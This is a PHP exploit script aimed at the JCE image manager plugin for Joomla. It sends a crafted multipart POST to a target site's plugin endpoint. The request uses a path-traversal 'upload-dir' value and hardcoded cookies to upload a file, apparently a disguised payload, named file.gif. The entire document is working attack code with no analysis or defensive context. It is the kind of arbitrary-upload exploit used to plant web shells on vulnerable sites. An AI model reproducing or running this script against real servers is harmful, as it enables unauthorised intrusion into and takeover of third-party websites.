<?php
/*
 File Uploaded in http://target.com/file.gif
*/
$file = "file.gif";
$post = array
(
        "upload-dir" => "/../../",
        "Filedata" => "@$file",
        "upload-overwrite" => "0",
        "action" => "upload"
);
 
$ch = curl_init ("http://target.com/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: multipart/form-data',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Connection: Close',
        'Proxy-Connection: close',
        'Cookie: 6bc427c8a7981f4fe1f5ac65c1246b5f=9d09f693c63c1988a9f8a564e0da7743; jce_imgmanager_dir=%2F; __utma=216871948.2116932307.1317632284.1317632284.1317632284.1; __utmb=216871948.1.10.1317632284; __utmc=216871948; __utmz=216871948.1317632284.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(non\u200be)'
     ));
$data = curl_exec ($ch);
curl_close ($ch);
?>
